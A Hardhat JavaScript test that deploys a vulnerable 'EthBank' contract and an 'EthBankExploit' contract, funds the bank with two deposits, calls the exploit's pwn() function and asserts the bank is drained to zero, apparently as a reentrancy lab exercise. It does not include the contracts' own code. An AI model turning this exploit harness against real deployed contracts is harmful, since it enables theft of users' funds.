const {ethers} = require("hardhat");
const {expect} = require("chai");

describe("Test re-entrancy", () => {

    let contract_eth_bank, contract_re_entrancy;
    let eth_bank_deployed, re_entrancy_deployed;

    it("should exploit eth_bank by using re entrancy", async() => {

        contract_eth_bank = await ethers.getContractFactory("EthBank");
        contract_re_entrancy = await ethers.getContractFactory("EthBankExploit");

        eth_bank_deployed = await contract_eth_bank.deploy();
        re_entrancy_deployed = await contract_re_entrancy.deploy(eth_bank_deployed.address);

        const [owner, alice, bob] = await ethers.getSigners();
        const contractAsAlice = await eth_bank_deployed.connect(alice);
        const contractAsBob = await eth_bank_deployed.connect(bob);

        await contractAsAlice.deposit({value:ethers.utils.parseEther("1.0")});
        await contractAsBob.deposit({value:ethers.utils.parseEther("1.0")});

        let balance = await ethers.provider.getBalance(eth_bank_deployed.address);
        console.log("Balance SC before %s",ethers.utils.formatEther(balance));

        let balance_attacker = await ethers.provider.getBalance(re_entrancy_deployed.address);
        console.log("Balance SC attacker before exploit : %s", ethers.utils.formatEther(balance_attacker));        

        await re_entrancy_deployed.pwn({value:ethers.utils.parseEther("1.0")});

        balance = await ethers.provider.getBalance(eth_bank_deployed.address);
        console.log("Balance SC after %s",ethers.utils.formatEther(balance));

        balance_attacker = await ethers.provider.getBalance(re_entrancy_deployed.address);
        console.log("Balance SC attacker after exploit : %s", ethers.utils.formatEther(balance_attacker));

        expect(balance).to.equal(0);

    })

})